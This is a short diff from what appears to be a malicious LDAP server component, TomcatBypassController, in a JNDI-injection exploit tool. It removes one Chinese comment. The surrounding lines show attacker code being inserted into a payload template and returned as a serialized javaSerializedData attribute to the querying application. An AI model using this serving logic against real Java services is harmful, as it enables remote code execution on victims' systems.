@@ -73,7 +73,6 @@ public class TomcatBypassController implements LdapController {
             String finalPayload = payloadTemplate.replace("{replacement}", code);
             ref.add(new StringRefAddr("x", finalPayload));
             e.addAttribute("javaSerializedData", Util.serialize(ref));
-            // 将条目发送至结果中，并将结果设置为成功
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
